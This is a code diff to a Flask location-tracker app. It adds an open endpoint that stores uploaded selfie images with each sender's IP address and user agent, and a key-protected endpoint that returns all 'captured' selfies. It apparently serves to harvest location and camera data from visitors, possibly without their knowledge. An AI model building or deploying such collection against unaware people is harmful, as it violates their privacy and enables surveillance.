@@ -4,6 +4,7 @@ from pymongo import MongoClient
 from datetime import datetime
 from functools import wraps
 import os
+import base64
 
 app = Flask(__name__)
 
@@ -18,6 +19,7 @@ if not MONGO_URI:
 client = MongoClient(MONGO_URI)
 db = client["location_tracker"]
 locations_collection = db["locations"]
+selfies_collection = db["selfies"]
 
 # Simple API key to protect read access to collected data.
 # Set this in your Render environment variables — do NOT hardcode a real key here.
@@ -113,6 +115,70 @@ def save_location():
         }), 500
 
 
+@app.route("/selfie", methods=["POST"])
+def save_selfie():
+    """
+    Receives a selfie image from the frontend.
+    Accepts both:
+      - multipart/form-data with an 'image' field (file upload)
+      - JSON with a base64-encoded 'image' field
+    """
+    try:
+        image_data = None
+        timestamp = datetime.utcnow().isoformat() + "Z"
+
+        # Check if it's a multipart file upload
+        if request.files:
+            file = request.files.get("image")
+            if file:
+                image_data = base64.b64encode(file.read()).decode("utf-8")
+                timestamp = request.form.get("timestamp", timestamp)
+
+        # Check if it's a JSON payload with base64 image
+        if not image_data and request.is_json:
+            data = request.get_json()
+            if data and data.get("image"):
+                image_data = data["image"]
+                timestamp = data.get("timestamp", timestamp)
+
+        if not image_data:
+            return jsonify({
+                "success": False,
+                "message": "No image data received."
+            }), 400
+
+        selfie_record = {
+            "image_base64": image_data,
+            "timestamp": timestamp,
+            "received_at": datetime.utcnow().isoformat() + "Z",
+            "ip_address": request.headers.get(
+                "X-Forwarded-For",
+                request.remote_addr
+            ),
+            "user_agent": request.headers.get("User-Agent")
+        }
+
+        result = selfies_collection.insert_one(selfie_record)
+
+        print("=" * 60, flush=True)
+        print("New selfie saved", flush=True)
+        print(f"ID: {result.inserted_id} | Timestamp: {timestamp}", flush=True)
+        print("=" * 60, flush=True)
+
+        return jsonify({
+            "success": True,
+            "message": "Selfie uploaded successfully.",
+            "id": str(result.inserted_id)
+        })
+
+    except Exception as e:
+        print(e, flush=True)
+        return jsonify({
+            "success": False,
+            "message": str(e)
+        }), 500
+
+
 @app.route("/locations", methods=["GET"])
 @require_api_key
 def get_locations():
@@ -139,6 +205,29 @@ def get_locations():
         "success": True,
         "count": len(locations),
         "locations": locations
+    })
+
+
+@app.route("/selfies", methods=["GET"])
+@require_api_key
+def get_selfies():
+    """Returns all captured selfies. Protected by API key."""
+    selfies = []
+
+    for doc in selfies_collection.find():
+        selfies.append({
+            "id": str(doc["_id"]),
+            "image_base64": doc.get("image_base64"),
+            "timestamp": doc.get("timestamp"),
+            "received_at": doc.get("received_at"),
+            "ip_address": doc.get("ip_address"),
+            "user_agent": doc.get("user_agent")
+        })
+
+    return jsonify({
+        "success": True,
+        "count": len(selfies),
+        "selfies": selfies
     })
 
 
